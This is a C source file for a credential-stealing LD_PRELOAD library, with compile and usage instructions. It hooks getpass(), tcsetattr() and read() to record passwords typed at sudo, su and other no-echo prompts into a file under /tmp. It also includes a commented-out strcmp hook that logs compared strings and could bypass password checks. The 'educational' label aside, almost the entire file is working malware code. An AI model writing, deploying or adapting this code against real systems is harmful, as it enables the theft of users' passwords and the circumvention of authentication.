/*
 * credential_hook.c - Credential Interception via LD_PRELOAD
 *
 * This demonstrates hooking authentication-related functions to
 * capture credentials. Commonly used to steal:
 *   - SSH passwords
 *   - sudo passwords
 *   - Application login credentials
 *
 * Compile: gcc -shared -fPIC -o credential_hook.so credential_hook.c -ldl
 * Usage:   LD_PRELOAD=./credential_hook.so <target_program>
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <termios.h>

#define CRED_LOG "/tmp/captured_credentials.txt"

/* Helper: Log captured credentials */
static void log_credential(const char *type, const char *value) {
    FILE *log = fopen(CRED_LOG, "a");
    if (log) {
        fprintf(log, "[%s] %s\n", type, value);
        fclose(log);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: getpass() - Classic password prompt function
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Used by: sudo, su, older programs
 * Note: getpass() is deprecated but still used
 */

char *getpass(const char *prompt) {
    static char *(*real_getpass)(const char *) = NULL;
    if (!real_getpass) {
        real_getpass = dlsym(RTLD_NEXT, "getpass");
    }

    /* Call real getpass to get the password */
    char *password = real_getpass(prompt);

    /* Capture it! */
    if (password) {
        log_credential("PASSWORD", password);
        fprintf(stderr, "\n[!] Password captured and logged\n");
    }

    return password;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: pam_get_authtok() - PAM authentication token
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Used by: Modern Linux authentication (sudo, login, ssh, etc.)
 *
 * Note: This is a simplified example. Real PAM hooking is more complex
 * as it requires linking against libpam.
 */

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: strcmp() - Bypass password comparison!
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Many simple programs do: if (strcmp(input, correct_password) == 0)
 * By always returning 0, we bypass the check!
 *
 * WARNING: This is VERY aggressive and will break many things.
 *          Only enable for specific targets.
 */

/*
int strcmp(const char *s1, const char *s2) {
    static int (*real_strcmp)(const char *, const char *) = NULL;
    if (!real_strcmp) {
        real_strcmp = dlsym(RTLD_NEXT, "strcmp");
    }

    // Log the comparison (might contain password!)
    log_credential("STRCMP_S1", s1);
    log_credential("STRCMP_S2", s2);

    // Uncomment to bypass ALL strcmp checks:
    // return 0;

    return real_strcmp(s1, s2);
}
*/

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: read() with password detection
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Detect when terminal echo is disabled (password entry mode)
 * and capture the input.
 */

static int echo_disabled = 0;

int tcsetattr(int fd, int optional_actions, const struct termios *termios_p) {
    static int (*real_tcsetattr)(int, int, const struct termios *) = NULL;
    if (!real_tcsetattr) {
        real_tcsetattr = dlsym(RTLD_NEXT, "tcsetattr");
    }

    /* Check if echo is being disabled (password entry!) */
    if (fd == STDIN_FILENO && !(termios_p->c_lflag & ECHO)) {
        echo_disabled = 1;
    } else if (fd == STDIN_FILENO && (termios_p->c_lflag & ECHO)) {
        echo_disabled = 0;
    }

    return real_tcsetattr(fd, optional_actions, termios_p);
}

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t result = real_read(fd, buf, count);

    /* If reading from stdin with echo disabled = password! */
    if (fd == STDIN_FILENO && echo_disabled && result > 0) {
        char *input = strndup(buf, result);
        /* Remove newline */
        char *nl = strchr(input, '\n');
        if (nl) *nl = '\0';

        log_credential("CAPTURED_INPUT", input);
        free(input);
    }

    return result;
}

/* Constructor: Initialize */
__attribute__((constructor))
void init(void) {
    FILE *log = fopen(CRED_LOG, "a");
    if (log) {
        fprintf(log, "\n=== New Session PID:%d ===\n", getpid());
        fclose(log);
    }
}
